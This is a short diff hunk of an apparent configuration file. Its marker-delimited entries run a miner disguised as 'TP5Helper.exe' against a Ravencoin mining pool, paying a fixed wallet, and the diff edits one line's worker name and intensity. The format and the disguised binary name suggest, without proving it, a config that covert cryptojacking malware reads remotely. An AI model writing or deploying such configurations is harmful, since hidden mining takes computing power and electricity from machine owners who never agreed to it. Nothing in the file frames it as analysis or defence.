@@ -9,7 +9,7 @@ AA897K.exe8AA
 AA996K.exe9AA
 ------------------------------------------------------------------------------------------------------------------------------------
 A1A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 14 -p x--A1A
-A2A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 15 -p x--A2A
+A2A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr15@pplns -i 16 -p x--A2A
 A3A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 16 -p x--A3A
 A4A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 13 -p x--A4A
 A5A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 14 -p x--A5A
